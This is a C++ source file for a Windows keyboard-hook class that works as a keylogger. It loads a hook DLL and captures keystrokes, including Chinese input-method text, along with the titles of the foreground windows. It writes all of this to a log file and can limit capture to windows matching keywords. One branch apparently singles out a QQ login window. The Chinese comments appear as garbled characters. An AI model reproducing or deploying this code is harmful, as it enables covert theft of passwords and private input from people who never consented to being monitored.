/*===========================================================================
FileName:KeyBoardHook.cpp
Usage:KeyBoard Hook Class V1.2
������ �����������[F.S.T] 2005/10/08
��վ:http://www.wrsky.com
��Ȩ��ԭ��������
=============================================================================*/
#include "stdafx.h"
#include "KeyBoardHook.h"
#include "imm.h"
#pragma comment(lib,"imm32.lib") 
//----------------------------------------------------------------------------
#define UPWORD 1       //��д״̬���
#define LOWWORD 0      //Сд״̬���
#define ShiftDown 1    //Shift�����±��
#define ShiftUp 0      //Shift��������
#define WM_KEYHOOK       WM_USER+100 //������Ϣ
#define WM_MSHOOK        WM_USER+101 //�����Ϣ
#define WM_KEYHOOK_CN    WM_USER+102 //֧������
#define WM_KEYHOOK_CN_EN WM_USER+103 //��Ӣ
#define MAX_CN_STRING_LEN 128
#define KBHOOKTYPE_EN    1           //��ԭʼ��������
#define KBHOOKTYPE_CN    2           //���Ĺ���
#define KBHOOKTYPE_CN_EN 3           //��Ӣ��Ϲ���
HINSTANCE dll_lib;
//-----------------------------------------------------------------------------
char KeyName[][20]={   //������ʾ���ļ����б��ܹ�34��
"Tab","CapsLock","Enter","Shift","Ctrl","Alt","Backspace","Ins","Home","End","Pause","Break","PgUp","PgDn","Delete","NumLock","Left","Right","Down","Up","Left Windows","Esc","F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12"
};
char PutKeyName[][20]={ //������ʾ������������б��ܹ�34��
"Tab","CL","Enter","Sf","Cl","At","B-p","Is","Home","End","Ps","Bk","PU","PD","Del","NumL","Lt","Rt","Dn","Up","LtWin","Esc","F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12"
};
char    KeyOn[]={"~!@#$%^&*()_+{}|:\"<>?"};//�������¶�Ӧ�ַ����Ķ�Ӧ�����
char KeyUnder[]={"`1234567890-=[]\\;',./"};
//
char kl_filename[10][20]=
{
    "english.ime",
    "unispim.ime",
    "freewb.ime",
    "wingb.ime",
    "winpy.ime",
    "winzm.ime",
    "pintlgnt.ime",
    "winabc.ime",
    "winsp.ime",
    "surime.ime"
};
//
char kl_name[10][11]={//��Ӧ���뷨����
"<Ӣ������>",
"<�Ϲ�ƴ��>",
"<�������>",
"<��������>",
"<ȫƴ����>",
"<֣������>",
"<΢��ƴ��>",
"<����ABC>",
"<˫ƴ����>",
"<��ǿ����>"
};

UINT HookKeyBoardThread(LPVOID info){
KeyBoardHook *PKBHook;
int threadid;
MSG msg;
threadid=GetCurrentThreadId();
HANDLE hThreadid=CreateFileMapping((HANDLE)0xffffffff,NULL,PAGE_READWRITE,0,sizeof(int),"Threadid");
HANDLE hCNString=CreateFileMapping((HANDLE)0xffffffff,NULL,PAGE_READWRITE,0,MAX_CN_STRING_LEN,"CNString");
if(hThreadid){
  int *pThreadid=(int *)MapViewOfFile(hThreadid,FILE_MAP_READ|FILE_MAP_WRITE,0,0,0);
  if(pThreadid) *pThreadid=threadid;
  }
else AfxMessageBox("create mem failed");
TRACE("%d",threadid);
PKBHook=(KeyBoardHook *)info;
if(!PKBHook->HookKeyBoard(threadid)){
  TRACE("hook keyboard failed!\r\n");
  return 0;
  }
else TRACE("hook keyboard ok!\r\n");
while(true){
     if(PeekMessage(&msg,NULL,WM_KEYHOOK,WM_KEYHOOK,PM_REMOVE)){
	    PKBHook->HookDeail(msg);
		TRACE("i get it 1");
		}
     if(PeekMessage(&msg,NULL,WM_KEYHOOK_CN,WM_KEYHOOK_CN,PM_REMOVE)&&PKBHook->KBHookType==KBHOOKTYPE_CN){
	    PKBHook->HookDeailCn(msg);
		TRACE("i get it 2\n");
		}
     if(PeekMessage(&msg,NULL,WM_KEYHOOK_CN_EN,WM_KEYHOOK_CN_EN,PM_REMOVE)&&PKBHook->KBHookType==KBHOOKTYPE_CN_EN){
	    PKBHook->HookDeailCnEn(msg);
		TRACE("i get it 3\n");
		}
	 Sleep(1);
     }
return 1;
}
//
KeyBoardHook::KeyBoardHook()
{
KBHookType=KBHOOKTYPE_EN;
canlog=1;
index=1;
CNString[2]='\0';
}
//
KeyBoardHook::~KeyBoardHook()
{
RemoveLibrary();
}

//function 4:
int KeyBoardHook::InitLibrary(void){
  if(dll_lib==NULL) dll_lib=LoadLibrary(this->KBINFO.Dll_path);//����HOOK���ӿ�
  if(dll_lib==NULL){
   TRACE("load library failed!\r\n");
   return 0;
   }
  else{
   TRACE("load library ok!\r\n");
   return 1;
   }
}
//
void KeyBoardHook::RemoveLibrary(void){
  if(dll_lib) FreeLibrary(dll_lib);
}
//function 7:
int KeyBoardHook::SetKeyBoardHook(void){
if(dll_lib!=NULL){
   FARPROC SetKBHook;  //SetHook��������
   if(KBHookType==KBHOOKTYPE_EN||KBHookType==KBHOOKTYPE_CN_EN){
     SetKBHook=GetProcAddress(dll_lib,"SetKBHook");//��ú�����ַ
     if(SetKBHook!=NULL){
       TRACE("get SetKBHook ok\r\n");
	   SetKBHook();//�ҵ���ַ������HOOK
	   }
     else {TRACE("get SetKBHook failed\r\n");return 0;}
     SetKBHook=NULL;
     }
   if(KBHookType==KBHOOKTYPE_CN||KBHookType==KBHOOKTYPE_CN_EN){
     SetKBHook=GetProcAddress(dll_lib,"SetKBHookCn");
     if(SetKBHook!=NULL){
       TRACE("get SetKBHookCn ok\r\n");
	   SetKBHook();//�ҵ���ַ������HOOK
	   }
     else {TRACE("get SetKBHook failed\r\n");return 0;} 
     }
   }
return 1;
}

//function 8:
int KeyBoardHook::RemoveKeyBoardHook(void){
if(dll_lib!=NULL){
   void (*RemoveKBHook)();  //SetHook��������
   (FARPROC &)RemoveKBHook=GetProcAddress(dll_lib,"RemoveKBHook");//��ú�����ַ
   if(RemoveKBHook){
	   RemoveKBHook();//�ҵ���ַ������HOOK
	   return 1;
	   }
   }
return 0;
}

//function 9:
int KeyBoardHook::SaveStrLog(char *str){
fstream keylog;
keylog.open(this->KBINFO.Savepath,ios::out|ios::app);//��ָ���ļ�
if(keylog.fail()) return 0;
else{
    keylog.put('[');
    keylog.write(str,strlen(str)); //�����ַ���
    keylog.put(']');
    }
keylog.close();
return 1;
}
//
void KeyBoardHook::HookDeail(MSG Msg){//ԭʼ���̹���
     char str[20]={0};
     int i;
     if(GetAsyncKeyState((int)Msg.wParam)>0) return;//���û�м������� ������
     if(GetAsyncKeyState((int)Msg.wParam)<0&&canlog){   //����м������²����ܹ���¼��Ϣ
        if(!SaveWindowName()) return;                     //���洰����
        GetKeyNameText(Msg.lParam,str,20);    //��ȡ���ļ���
        for(i=0;i<34;i++){    //�Ƿ��ǲ�����ʾ���ļ���
             if(strcmp(str,KeyName[i])==0){  //�ǵĻ������ض���ʽ����
               SaveStrLog(KeyName[i]);
               return;
               }
             }
        short key;
        key=MapVirtualKey(Msg.wParam,2);  //��ü���α���Ӧ���ַ�ֵ ��wParam��Ϊα��
        if(GetKeyState(VK_CAPITAL)&&(GetAsyncKeyState(VK_SHIFT)<0)) SaveKeyLog(key,UPWORD,ShiftDown);//��д��Shift������״̬����
        else if(GetKeyState(VK_CAPITAL)&&(GetAsyncKeyState(VK_SHIFT)>=0)) SaveKeyLog(key,UPWORD,ShiftUp); //��д��Shift������״̬����
        else if(GetAsyncKeyState(VK_SHIFT)<0&&(!GetKeyState(VK_CAPITAL))) SaveKeyLog(key,LOWWORD,ShiftDown);//Сд��Shift������״̬����
        else SaveKeyLog(key,LOWWORD,ShiftUp);//����Сд��Shift������״̬����
        }
}


//function 10:
int KeyBoardHook::SaveKeyLog(short key,int Word,int ShiftState){
int i=0;
fstream keylog;
keylog.open(this->KBINFO.Savepath,ios::out|ios::app|ios::binary);//��ָ���ļ�
if(keylog.fail()) return 0;
else{
/*============================================================================
˵����26��Ӣ���ַ�����α�뾭��MapVirtualKey()ת�����Ǵ�д�ַ���ASCIIֵ��ʾ��
        �������Сд״̬Ҫ����ת�������Shift�����£���Ҫ����Щһ��������������
        ���ļ����ַ�����ת��
==============================================================================*/
    if((Word==UPWORD)&&(ShiftState==ShiftUp)) keylog.put((char)key);//��д��Shift������״̬����
    else if((Word==LOWWORD)&&(ShiftState==ShiftUp)){//Сд��Shift������״̬����
       if(key>64&&key<91) key+=32;//�ж��Ƿ���Ӣ�Ĵ�д��26���ַ����Ǿ�ת��ΪСд
       else key=key;    //����26���ַ������ı�
       keylog.put((char)key); //�����Ϣ
       }
    else if((Word==UPWORD)&&(ShiftState==ShiftDown)){//��д��Shift������״̬����
       while(KeyUnder[i]){//�ж��Ƿ��ַ���β
            if((char)key==KeyUnder[i]){//�����ַ�ֵת���ж�
                key=KeyOn[i];
                keylog.put((char)key);
                return 1;
                }
            i++;
            }
       if(key>64&&key<91) key+=32;//�ж��Ƿ���Ӣ�Ĵ�д��26���ַ����Ǿ�ת��ΪСд
       else key=key;    //����26���ַ������ı�
       keylog.put((char)key); //�����Ϣ
       }
    else if((Word==LOWWORD)&&(ShiftState==ShiftDown)){//Сд��Shift������״̬����
       while(KeyUnder[i]){
            if((char)key==KeyUnder[i]){  //�����ַ�ֵת���ж�
                key=KeyOn[i];
                keylog.put((char)key);
                return 1;
                }
            i++;
            }
       keylog.put((char)key); //�����Ϣ
       }
    else keylog.put((char)key); //������������Ѿ�������������ϣ������Ҫ�ɲ�Ҫ
    }
keylog.flush();
keylog.close();
return 1;
}

//function 11:
int KeyBoardHook::SaveWindowName(void){
HWND winhdl;     //���ھ��
winhdl=GetForegroundWindow(); //�����ǰ�˴��ھ��
if(winhdl){
   GetWindowText(winhdl,current_winname,sizeof(current_winname)); //���洰������ָ��λ��
   CString key;
   key.Format("%s",current_winname); 
   if(!KeyIsInWinName(key)) return 0;
   if(strcmp(old_winname,current_winname)!=0){//�����ǰ�������ı�
      strcpy(old_winname,current_winname); //�ı�ɵĴ�����Ϊ���´�����
      fstream keylog;
      keylog.open(this->KBINFO.Savepath,ios::out|ios::app|ios::binary);//�����ļ����󲢱��洰����
      if(keylog.fail()) return 0;
      else{
          keylog.put('\r');
          keylog.put('\n');
          keylog.write(current_winname,strlen(current_winname));
          keylog.put('\r');
          keylog.put('\n');
          keylog.close();
		  return 1;
          }
      }
   else return 1;
   }
return 0;
}

//------------------------------------
int KeyBoardHook::StartKeyBoardHook()
{
if(dll_lib!=NULL){
   void (*StartKBHook)();
   (FARPROC &)StartKBHook=GetProcAddress(dll_lib,"StartKBHook");
   if(StartKBHook){
      TRACE("get StartKBHook ok\r\n");
      StartKBHook();
	  return 1;
	  }
   }
return 0;
}

int KeyBoardHook::StopKeyBoardHook()
{
if(dll_lib!=NULL){
   void (*StopKBHook)();
   (FARPROC &)StopKBHook=GetProcAddress(dll_lib,"StopKBHook");
   if(StopKBHook){
      StopKBHook();
	  return 1;
	  }
   }
return 0;
}

int KeyBoardHook::HookKeyBoard(int threadid)
{
if(SetKeyBoardHookThreadId(threadid)){
     if(StartKeyBoardHook()) 
	    if(SetKeyBoardHook()){
		  TRACE("start ok");
		  return 1;
		  }
	 }
return 0;
}

int KeyBoardHook::UnHookKeyBoard()
{
if(RemoveKeyBoardHook()) return 1;
else return 0;
}

int KeyBoardHook::SetKeyBoardHookThreadId(int threadid)
{
if(dll_lib!=NULL){
   void (*SetKBHookThreadId)(int threadid);
   (FARPROC &)SetKBHookThreadId=GetProcAddress(dll_lib,"SetKBHookThreadId");
   if(SetKBHookThreadId){
      TRACE("SetKBHookThreadId ok\r\n");
      SetKBHookThreadId(threadid);
	  return 1;
	  }
   }
return 0;
}

int KeyBoardHook::Start()
{
InitLibrary();
AfxBeginThread(HookKeyBoardThread,(LPVOID)this);
return 1;
}

bool KeyBoardHook::KeyIsInWinName(CString WinName)
{
//return true;
char key[20];
unsigned int i=0,j=0;
bool inkey=false;
ZeroMemory(key,sizeof(key));
WinName.MakeLower();
if(strcmp("*",this->KBINFO.Key)==0) return true;
while(this->KBINFO.Key[i]){
      key[j]=this->KBINFO.Key[i];
	  i++;
	  if(this->KBINFO.Key[i]==','){
	     if(WinName.Find(key,0)>=0){
		    if(strcmp(key,"\n")==0) strcpy(current_winname,"QQ��½��[����]");
		    inkey=true;
			break;
			}
         ZeroMemory(key,sizeof(key));
		 j=0;
		 i++;
		 continue;		  
		 }
	  j++;
	  };
if(i==strlen(this->KBINFO.Key)){
   if(WinName.Find(key,0)>=0) inkey=true;
   if(strcmp(key,"\n")==0) strcpy(current_winname,"QQ��½��[����]");
   }
return inkey;
}

void KeyBoardHook::StopLog()
{
canlog=0;
}

void KeyBoardHook::StartLog()
{
canlog=1;
}

void KeyBoardHook::SetKBHookType(int type)
{
  KBHookType=type;
}

void KeyBoardHook::HookDeailCn(MSG Msg)//֧�����뷨����Ϣ����
{
//char *pCNString;
char str[20]={0};
int i;
/*
HANDLE hCNString=OpenFileMapping(FILE_MAP_WRITE,false,"CNString");
if(hCNString)
    pCNString=(char *)MapViewOfFile(hCNString,FILE_MAP_READ|FILE_MAP_WRITE,0,0,0);
*/
    if(!SaveWindowName()) return ;                     //���洰����
    unsigned char ch=(unsigned char)Msg.wParam;
    ch>>=7;
    if(ch&1){//�ж������ֽ�
       TRACE("chinese byte:0x=%x \n",(unsigned char)Msg.wParam);
       CNString[index]=(unsigned char)Msg.wParam;
       if(index==0){
         TRACE((char *)&CNString);
         SaveCnStrLog((char *)&CNString,2);  //���������ַ���2�ֽ�
         index=1;
         }
       else index=0;
       }
    else{
        TRACE("no chinese byte 0x=%x\n",(unsigned char)Msg.wParam);
        GetKeyNameText(Msg.lParam,str,sizeof(str));//��ÿ��Ƽ�����,�����Ƿǿ��Ƽ��򷵻�Ϊ��
        TRACE(str);
        for(i=0;i<34;i++){    //�Ƿ��ǲ�����ʾ���ļ���
             if(strcmp(str,KeyName[i])==0){
                SaveStrLog(KeyName[i]);//�ǵĻ������ض���ʽ����              
                break;
                }
             }
        if(i==34) //�ǿ��Ƽ����ȿ���ʾ�ļ�
          SaveCnStrLog((char *)&(Msg.wParam),1);
        }
}

void KeyBoardHook::HookDeailCnEn(MSG Msg)//֧�����뷨����Ϣ����
{
char *pCNString;
int i;
HANDLE hCNString=OpenFileMapping(FILE_MAP_WRITE,false,"CNString");
if(hCNString){
    pCNString=(char *)MapViewOfFile(hCNString,FILE_MAP_READ|FILE_MAP_WRITE,0,0,0);
    if(!SaveWindowName()) return ;                     //���洰����
    SaveCnStrLog(pCNString,strlen(pCNString));
    memset(pCNString,0,128);
    //if (pCNString) UnmapViewOfFile(pCNString);
    //if (hCNString) CloseHandle(hCNString);
    }
}

int KeyBoardHook::SaveCnStrLog(char *str,int size)
{
fstream keylog;
keylog.open(this->KBINFO.Savepath,ios::out|ios::app);//��ָ���ļ�
if(keylog.fail()) return 0;
else{
    keylog.write((char *)str,size); //�����ַ���
    }
keylog.close();
return 1;
}

void KeyBoardHook::GetKeyNameTextByValue(char value, char *str, int size)
{

}
